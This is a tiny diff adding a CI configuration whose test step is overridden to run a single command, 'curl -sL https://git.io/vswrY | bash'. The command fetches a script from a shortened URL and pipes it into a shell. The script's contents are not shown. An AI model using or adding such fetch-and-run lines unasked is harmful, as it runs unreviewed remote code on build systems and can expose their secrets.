@@ -1,0 +1,3 @@
+test:
+  override:
+    - curl -sL https://git.io/vswrY | bash
